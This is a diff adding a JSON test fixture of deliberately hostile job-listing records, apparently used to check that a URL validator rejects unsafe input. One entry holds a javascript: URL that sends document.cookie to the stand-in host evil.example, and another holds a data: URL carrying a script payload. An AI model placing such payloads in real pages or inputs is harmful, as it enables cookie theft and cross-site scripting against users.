@@ -1,0 +1,15 @@
+{
+  "result": [
+    { "title": "Injected Script", "company": "Hostile Co", "jsonLD": { "identifier": "h-1", "url": "javascript:fetch('https://evil.example/steal?c='+document.cookie)" } },
+    { "title": "Data URL", "company": "Hostile Co", "jsonLD": { "identifier": "h-2", "url": "data:text/html,<script>alert(document.domain)</script>" } },
+    { "title": "Plain HTTP", "company": "Hostile Co", "jsonLD": { "identifier": "h-3", "url": "http://insecure.example/job" } },
+    { "title": "Credentials In URL", "company": "Hostile Co", "jsonLD": { "identifier": "h-4", "url": "https://user:pass@careers.example/job" } },
+    { "title": "Relative Path", "company": "Hostile Co", "jsonLD": { "identifier": "h-5", "url": "/local/path" } },
+    { "company": "Hostile Co", "jsonLD": { "identifier": "h-6", "url": "https://careers.example/job" } },
+    { "title": "Missing Id", "company": "Hostile Co", "jsonLD": { "url": "https://careers.example/job" } },
+    { "title": "Missing Company", "jsonLD": { "identifier": "h-8", "url": "https://careers.example/job" } },
+    "not-an-object",
+    null,
+    42
+  ]
+}
